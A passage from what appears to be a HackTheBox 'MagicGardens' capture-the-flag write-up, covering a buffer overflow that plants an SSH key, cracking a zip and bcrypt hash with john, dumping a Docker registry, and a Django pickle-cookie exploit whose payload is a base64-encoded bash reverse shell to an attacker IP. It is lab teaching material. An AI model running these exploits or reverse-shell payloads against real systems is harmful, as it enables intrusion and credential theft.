<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">‚îå‚îÄ‚îÄ(kali„âøkali)-[~]</span><br><span class="line">‚îî‚îÄ$ msf-pattern_offset -q Aa4A -l 65500 </span><br><span class="line">[*] Exact match at offset 12</span><br><span class="line">[*] Exact match at offset 20292</span><br><span class="line">[*] Exact match at offset 40572</span><br><span class="line">[*] Exact match at offset 60852</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<p>I‚Äôll go with the ‚Äú12‚Äù offset.<br>One last step is I‚Äôll inject a random known string to check with this offset:</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line">server_address = (<span class="string">&#x27;::1&#x27;</span>,<span class="number">6666</span>)</span><br><span class="line">s = socket.socket(socket.AF_INET6, socket.SOCK_DGRAM)</span><br><span class="line">s.connect(server_address)</span><br><span class="line"></span><br><span class="line">data = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;bof.txt&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        data = <span class="built_in">bytearray</span>(f.read())</span><br><span class="line">new = <span class="string">b&quot;/tmp/kujen.txt&quot;</span></span><br><span class="line">sendData = data[:<span class="number">65372</span>] + new</span><br><span class="line">code = <span class="string">&quot;kujenRocks&quot;</span></span><br><span class="line">sendData[<span class="number">12</span>:<span class="number">12</span>+<span class="built_in">len</span>(code)]=code.encode()</span><br><span class="line">s.send(sendData)</span><br></pre></td></tr></table></figure></div>
<p>And we got it:</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">‚îå‚îÄ‚îÄ(kali„âøkali)-[~]</span><br><span class="line">‚îî‚îÄ$ <span class="built_in">cat</span> /tmp/kujen.txt </span><br><span class="line">kujenRocksa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6A</span><br></pre></td></tr></table></figure></div>


<p>Now let‚Äôs inject our ssh public key inside of Alex‚Äôs ssh directory:</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line">server_address = (<span class="string">&#x27;::1&#x27;</span>,<span class="number">6666</span>)</span><br><span class="line">s = socket.socket(socket.AF_INET6, socket.SOCK_DGRAM)</span><br><span class="line">s.connect(server_address)</span><br><span class="line"></span><br><span class="line">data = <span class="built_in">bytearray</span>(<span class="string">b&#x27;\n&#x27;</span>*<span class="number">65403</span>)</span><br><span class="line">new = <span class="string">b&quot;/home/alex/.ssh/authorized_keys&quot;</span></span><br><span class="line">sendData = data[:<span class="number">65372</span>] + new</span><br><span class="line">code = <span class="string">&quot;ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIA8HIyGJoNXYUf9/e1b7ZkdtI7pL0Ohz4pfbX03FvStL kali@kali&quot;</span></span><br><span class="line">sendData[<span class="number">12</span>:<span class="number">12</span>+<span class="built_in">len</span>(code)]=code.encode()</span><br><span class="line">s.send(sendData)</span><br></pre></td></tr></table></figure></div>

<p>And we‚Äôre in:</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">‚îå‚îÄ‚îÄ(kali„âøkali)-[~]</span><br><span class="line">‚îî‚îÄ$ ssh alex@magicgardens.htb </span><br><span class="line">Linux magicgardens 6.1.0-20-amd64 <span class="comment">#1 SMP PREEMPT_DYNAMIC Debian 6.1.85-1 (2024-04-11) x86_64</span></span><br><span class="line"></span><br><span class="line">The programs included with the Debian GNU/Linux system are free software;</span><br><span class="line">the exact distribution terms <span class="keyword">for</span> each program are described <span class="keyword">in</span> the</span><br><span class="line">individual files <span class="keyword">in</span> /usr/share/doc/*/copyright.</span><br><span class="line"></span><br><span class="line">Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent</span><br><span class="line">permitted by applicable law.</span><br><span class="line">You have mail.</span><br><span class="line">Last login: Sat Feb  8 05:58:50 2025 from 10.10.16.39</span><br><span class="line">alex@magicgardens:~$ <span class="built_in">id</span></span><br><span class="line">uid=1000(alex) gid=1000(alex) <span class="built_in">groups</span>=1000(alex),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),100(<span class="built_in">users</span>),106(netdev),110(bluetooth)</span><br><span class="line">alex@magicgardens:~$ <span class="built_in">cat</span> user.txt </span><br><span class="line">915a2510beb449efc4a0945814ba5e73</span><br><span class="line">alex@magicgardens:~$ </span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<h3 id="Privilege-Escalation-Docker-Escape"><a href="#Privilege-Escalation-Docker-Escape" class="headerlink" title="Privilege Escalation - Docker Escape"></a>Privilege Escalation - Docker Escape</h3><p>One of the first things to check is existing emails:</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">alex@magicgardens:/var/mail$ <span class="built_in">cat</span> alex </span><br><span class="line">From root@magicgardens.magicgardens.htb  Fri Sep 29 09:31:49 2023</span><br><span class="line">Return-Path: &lt;root@magicgardens.magicgardens.htb&gt;</span><br><span class="line">X-Original-To: alex@magicgardens.magicgardens.htb</span><br><span class="line">Delivered-To: alex@magicgardens.magicgardens.htb</span><br><span class="line">Received: by magicgardens.magicgardens.htb (Postfix, from userid 0)</span><br><span class="line">        <span class="built_in">id</span> 3CDA93FC96; Fri, 29 Sep 2023 09:31:49 -0400 (EDT)</span><br><span class="line">MIME-Version: 1.0</span><br><span class="line">Content-Type: multipart/mixed; boundary=<span class="string">&quot;1804289383-1695994309=:37178&quot;</span></span><br><span class="line">Subject: Auth file <span class="keyword">for</span> docker</span><br><span class="line">To: &lt;alex@magicgardens.magicgardens.htb&gt;</span><br><span class="line">User-Agent: mail (GNU Mailutils 3.15)</span><br><span class="line">Date: Fri, 29 Sep 2023 09:31:49 -0400</span><br><span class="line">Message-Id: &lt;20230929133149.3CDA93FC96@magicgardens.magicgardens.htb&gt;</span><br><span class="line">From: root &lt;root@magicgardens.magicgardens.htb&gt;</span><br><span class="line"></span><br><span class="line">--1804289383-1695994309=:37178</span><br><span class="line">Content-Type: text/plain; charset=UTF-8</span><br><span class="line">Content-Disposition: inline</span><br><span class="line">Content-Transfer-Encoding: 8bit</span><br><span class="line">Content-ID: &lt;20230929093149.37178@magicgardens.magicgardens.htb&gt;</span><br><span class="line"></span><br><span class="line">Use this file <span class="keyword">for</span> registry configuration. The password is on your desk</span><br><span class="line"></span><br><span class="line">--1804289383-1695994309=:37178</span><br><span class="line">Content-Type: application/octet-stream; name=<span class="string">&quot;auth.zip&quot;</span></span><br><span class="line">Content-Disposition: attachment; filename=<span class="string">&quot;auth.zip&quot;</span></span><br><span class="line">Content-Transfer-Encoding: <span class="built_in">base64</span></span><br><span class="line">Content-ID: &lt;20230929093149.37178.1@magicgardens.magicgardens.htb&gt;</span><br><span class="line"></span><br><span class="line">UEsDBAoACQAAAG6osFh0pjiyVAAAAEgAAAAIABwAaHRwYXNzd2RVVAkAA29KRmbOSkZmdXgLAAEE</span><br><span class="line">6AMAAAToAwAAVb+x1HWvt0ZpJDnunJUUZcvJr8530ikv39GM1hxULcFJfTLLNXgEW2TdUU3uZ44S</span><br><span class="line">q4L6Zcc7HmUA041ijjidMG9iSe0M/y1tf2zjMVg6Dbc1ASfJUEsHCHSmOLJUAAAASAAAAFBLAQIe</span><br><span class="line">AwoACQAAAG6osFh0pjiyVAAAAEgAAAAIABgAAAAAAAEAAACkgQAAAABodHBhc3N3ZFVUBQADb0pG</span><br><span class="line">ZnV4CwABBOgDAAAE6AMAAFBLBQYAAAAAAQABAE4AAACmAAAAAAA=</span><br><span class="line">--1804289383-1695994309=:37178--</span><br><span class="line"></span><br><span class="line">alex@magicgardens:/var/mail$ </span><br></pre></td></tr></table></figure></div>
<p>Alex was sent an <code>auth.zip</code> file, let‚Äôs decode it and see what it has:</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">‚îå‚îÄ‚îÄ(root„âøkali)-[~]</span><br><span class="line">‚îî‚îÄ<span class="comment"># echo &#x27;UEsDBAoACQAAAG6osFh0pjiyVAAAAEgAAAAIABwAaHRwYXNzd2RVVAkAA29KRmbOSkZmdXgLAAEE6AMAAAToAwAAVb+x1HWvt0ZpJDnunJUUZcvJr8530ikv39GM1hxULcFJfTLLNXgEW2TdUU3uZ44Sq4L6Zcc7HmUA041ijjidMG9iSe0M/y1tf2zjMVg6Dbc1ASfJUEsHCHSmOLJUAAAASAAAAFBLAQIeAwoACQAAAG6osFh0pjiyVAAAAEgAAAAIABgAAAAAAAEAAACkgQAAAABodHBhc3N3ZFVUBQADb0pGZnV4CwABBOgDAAAE6AMAAFBLBQYAAAAAAQABAE4AAACmAAAAAAA=&#x27; | base64 -d &gt; auth.zip         </span></span><br><span class="line">                                                                                      </span><br><span class="line">‚îå‚îÄ‚îÄ(root„âøkali)-[~]</span><br><span class="line">‚îî‚îÄ<span class="comment"># unzip auth.zip </span></span><br><span class="line">Archive:  auth.zip</span><br><span class="line">[auth.zip] htpasswd password: </span><br><span class="line">   skipping: htpasswd                incorrect password</span><br></pre></td></tr></table></figure></div>

<p>However we need a password for it, let‚Äôs crack it then:</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">‚îå‚îÄ‚îÄ(root„âøkali)-[~]</span><br><span class="line">‚îî‚îÄ<span class="comment">#  john  -w=/usr/share/wordlists/rockyou.txt alex.hash    </span></span><br><span class="line"></span><br><span class="line">Using default input encoding: UTF-8</span><br><span class="line">Loaded 1 password <span class="built_in">hash</span> (PKZIP [32/64])</span><br><span class="line">Will run 4 OpenMP threads</span><br><span class="line">Press <span class="string">&#x27;q&#x27;</span> or Ctrl-C to abort, almost any other key <span class="keyword">for</span> status</span><br><span class="line">realmadrid       (auth.zip/htpasswd)     </span><br><span class="line">1g 0:00:00:00 DONE (2025-02-08 11:59) 50.00g/s 409600p/s 409600c/s 409600C/s 123456..whitetiger</span><br><span class="line">Use the <span class="string">&quot;--show&quot;</span> option to display all of the cracked passwords reliably</span><br><span class="line">Session completed. </span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<p>(my favourite team haha)</p>
<p>And this is the content of the file:</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">‚îå‚îÄ‚îÄ(root„âøkali)-[~]</span><br><span class="line">‚îî‚îÄ<span class="comment"># cat htpasswd     </span></span><br><span class="line">AlexMiles:$2y$05<span class="variable">$KKShqNw</span>.A66mmpEqmNJ0kuoBwO2rbdWetc7eXA7TbjhHZGs2Pa5Hq</span><br></pre></td></tr></table></figure></div>

<p>We crack that one again:</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">‚îå‚îÄ‚îÄ(root„âøkali)-[~]</span><br><span class="line">‚îî‚îÄ<span class="comment">#  john  -w=/usr/share/wordlists/rockyou.txt htpasswd    </span></span><br><span class="line"></span><br><span class="line">Using default input encoding: UTF-8</span><br><span class="line">Loaded 1 password <span class="built_in">hash</span> (bcrypt [Blowfish 32/64 X3])</span><br><span class="line">Cost 1 (iteration count) is 32 <span class="keyword">for</span> all loaded hashes</span><br><span class="line">Will run 4 OpenMP threads</span><br><span class="line">Press <span class="string">&#x27;q&#x27;</span> or Ctrl-C to abort, almost any other key <span class="keyword">for</span> status</span><br><span class="line">diamonds         (AlexMiles)     </span><br><span class="line">1g 0:00:00:00 DONE (2025-02-08 12:00) 4.761g/s 4628p/s 4628c/s 4628C/s blonde..87654321</span><br><span class="line">Use the <span class="string">&quot;--show&quot;</span> option to display all of the cracked passwords reliably</span><br><span class="line">Session completed. </span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<p>And we got the password!<br>Taking a look at our network interfaces, we find some for docker. Let‚Äôs check process for anything docker-related then:</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">alex@magicgardens:~$ ip a</span><br><span class="line">1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000</span><br><span class="line">    <span class="built_in">link</span>/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00</span><br><span class="line">    inet 127.0.0.1/8 scope host lo</span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line">    inet6 ::1/128 scope host noprefixroute </span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line">2: eth0: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc mq state UP group default qlen 1000</span><br><span class="line">    <span class="built_in">link</span>/ether 00:50:56:94:ad:b5 brd ff:ff:ff:ff:ff:ff</span><br><span class="line">    altname enp3s0</span><br><span class="line">    altname ens160</span><br><span class="line">    inet 10.129.231.24/16 brd 10.129.255.255 scope global dynamic eth0</span><br><span class="line">       valid_lft 2264sec preferred_lft 2264sec</span><br><span class="line">    inet6 dead:beef::250:56ff:fe94:adb5/64 scope global dynamic mngtmpaddr </span><br><span class="line">       valid_lft 86398sec preferred_lft 14398sec</span><br><span class="line">    inet6 fe80::250:56ff:fe94:adb5/64 scope <span class="built_in">link</span> </span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line">3: docker0: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc noqueue state UP group default </span><br><span class="line">    <span class="built_in">link</span>/ether 02:42:92:b0:a9:3d brd ff:ff:ff:ff:ff:ff</span><br><span class="line">    inet 172.17.0.1/16 brd 172.17.255.255 scope global docker0</span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line">    inet6 fe80::42:92ff:feb0:a93d/64 scope <span class="built_in">link</span> </span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line">5: veth6339100@if4: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc noqueue master docker0 state UP group default </span><br><span class="line">    <span class="built_in">link</span>/ether da:50:b1:69:72:7f brd ff:ff:ff:ff:ff:ff link-netnsid 2</span><br><span class="line">    inet6 fe80::d850:b1ff:fe69:727f/64 scope <span class="built_in">link</span> </span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line">7: veth0c84d95@if6: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc noqueue master docker0 state UP group default </span><br><span class="line">    <span class="built_in">link</span>/ether 56:c8:f4:aa:72:c4 brd ff:ff:ff:ff:ff:ff link-netnsid 1</span><br><span class="line">    inet6 fe80::54c8:f4ff:feaa:72c4/64 scope <span class="built_in">link</span> </span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line">9: veth528240c@if8: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc noqueue master docker0 state UP group default </span><br><span class="line">    <span class="built_in">link</span>/ether 86:3e:a6:9a:39:71 brd ff:ff:ff:ff:ff:ff link-netnsid 0</span><br><span class="line">    inet6 fe80::843e:a6ff:fe9a:3971/64 scope <span class="built_in">link</span> </span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line">alex@magicgardens:~$ ps auxf | grep -i docker</span><br><span class="line">alex        5037  0.0  0.0   6332  2132 pts/0    S+   06:10   0:00              \_ grep -i docker</span><br><span class="line">root        1025  0.0  2.1 1827668 85144 ?       Ssl  02:44   0:02 /usr/sbin/dockerd -H fd:// --containerd=/run/containerd/containerd.sock</span><br><span class="line">root        1493  0.0  0.3 1082488 14852 ?       Sl   02:44   0:00  \_ /usr/sbin/docker-proxy -proto tcp -host-ip 0.0.0.0 -host-port 5000 -container-ip 172.17.0.2 -container-port 5000</span><br><span class="line">root        1499  0.0  0.3 1156220 12988 ?       Sl   02:44   0:00  \_ /usr/sbin/docker-proxy -proto tcp -host-ip :: -host-port 5000 -container-ip 172.17.0.2 -container-port 5000</span><br><span class="line">root        1512  0.0  0.3 1082488 12948 ?       Sl   02:44   0:00  \_ /usr/sbin/docker-proxy -proto tcp -host-ip 127.0.0.1 -host-port 8080 -container-ip 172.17.0.3 -container-port 80</span><br><span class="line">root        1526  0.0  0.4 1303940 17008 ?       Sl   02:44   0:01  \_ /usr/sbin/docker-proxy -proto tcp -host-ip 127.0.0.1 -host-port 8000 -container-ip 172.17.0.4 -container-port 80</span><br><span class="line">root        1617  0.0  0.5 728256 22984 ?        Ssl  02:44   0:01  \_ registry serve /etc/docker/registry/config.yml</span><br><span class="line">alex@magicgardens:~$ </span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<p>We can use this <a class="link"   target="_blank" rel="noopener" href="https://github.com/Syzik/DockerRegistryGrabber" >https://github.com/Syzik/DockerRegistryGrabber <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> to dump the docker images using these creds AlexMiles:diamonds  :</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">‚îå‚îÄ‚îÄ(kali„âøkali)-[~/DockerRegistryGrabber]</span><br><span class="line">‚îî‚îÄ$ python3 drg.py https://magicgardens.htb -U AlexMiles -P diamonds --dump magicgardens.htb</span><br><span class="line">[+] BlobSum found 32</span><br><span class="line">[+] Dumping magicgardens.htb</span><br><span class="line">    [+] Downloading : d3a3443a740ae9a727dbd8868b751b492da27507f3cbbe0965982e65c436b8c0</span><br><span class="line">    [+] Downloading : 2ed799371a1863449219ad8510767e894da4c1364f94701e7a26cc983aaf4ca6</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
<p>Now I‚Äôll lookg for something interesting. And after some time, I found some Django secret key while I was looking for stuff related to Morty:</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">‚îî‚îÄ$ zgrep -la morty *.tar.gz</span><br><span class="line">2ed799371a1863449219ad8510767e894da4c1364f94701e7a26cc983aaf4ca6.tar.gz</span><br><span class="line">480311b89e2d843d87e76ea44ffbb212643ba89c1e147f0d0ff800b5fe8964fb.tar.gz</span><br><span class="line">b0c11cc482abe59dbeea1133c92720f7a3feca9c837d75fd76936b1c6243938c.tar.gz</span><br><span class="line">d3a3443a740ae9a727dbd8868b751b492da27507f3cbbe0965982e65c436b8c0.tar.gz</span><br><span class="line">d66316738a2760996cb59c8eb2b28c8fa10a73ce1d98fb75fda66071a1c659d6.tar.gz</span><br></pre></td></tr></table></figure></div>

<p>And we get our SECRET_KEY: <code>SECRET_KEY=55A6cc8e2b8#ae1662c34)618U549601$7eC3f0@b1e8c2577J22a8f6edcb5c9b80X8f4&amp;87b</code></p>
<p>A point later pointed me to this article: <a class="link"   target="_blank" rel="noopener" href="https://www.cnblogs.com/-zhong/p/13463486.html" >https://www.cnblogs.com/-zhong/p/13463486.html <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> talking about an RCE in Django.</p>
<p>We‚Äôll simply put the SECRET_KEY inside of the code, get a session cookie that we‚Äôll later inject inside of a request going to the Django instance, and get our root shell.</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> django.contrib.sessions.serializers <span class="keyword">import</span> PickleSerializer</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> django.core <span class="keyword">import</span> signing</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> django.conf <span class="keyword">import</span> settings</span><br><span class="line"></span><br><span class="line">settings.configure(SECRET_KEY=<span class="string">&quot;55A6cc8e2b8#ae1662c34)618U549601$7eC3f0@b1e8c2577J22a8f6edcb5c9b80X8f4&amp;87b&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">CreateTmpFile</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line"></span><br><span class="line">        <span class="keyword">import</span> subprocess</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> (subprocess.call,</span><br><span class="line"></span><br><span class="line">                ([<span class="string">&#x27;bash&#x27;</span>,</span><br><span class="line"></span><br><span class="line">                  <span class="string">&#x27;-c&#x27;</span>,<span class="string">&#x27;echo L2Jpbi9iYXNoIC1jICcvYmluL2Jhc2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTYuMzkvNDQ0NCAwPiYxJw== | base64 -d | bash&#x27;</span>],))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sess = signing.dumps(</span><br><span class="line"></span><br><span class="line">    obj=CreateTmpFile(),</span><br><span class="line"></span><br><span class="line">    serializer=PickleSerializer,</span><br><span class="line"></span><br><span class="line">    salt=<span class="string">&#x27;django.contrib.sessions.backends.signed_cookies&#x27;</span></span><br><span class="line"></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(sess)</span><br><span class="line">                                                                                      </span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">‚îå‚îÄ‚îÄ(kali„âøkali)-[~]</span><br><span class="line">‚îî‚îÄ$ python3 exploit.py                                 </span><br><span class="line">gAWVmgAAAAAAAACMCnN1YnByb2Nlc3OUjARjYWxslJOUXZQojARiYXNolIwCLWOUjGxlY2hvIEwySnBiaTlpWVhOb0lDMWpJQ2N2WW1sdUwySmhjMmdnTFdrZ1BpWWdMMlJsZGk5MFkzQXZNVEF1TVRBdU1UWXVNemt2TkRRME5DQXdQaVl4Snc9PSB8IGJhc2U2NCAtZCB8IGJhc2iUZYWUUpQu:1tgj0G:8N1ldc_ZX9dgBHeT-zRhsMT-jNEo3571F7eL7QE6Zwo</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<p>Now we gonna inject this session cookie:</p>
<div class="highlight-container" data-rel="Http"><figure class="iseeu highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/admin/</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>magicgardens.htb</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8</span><br><span class="line"><span class="attribute">Sec-GPC</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: 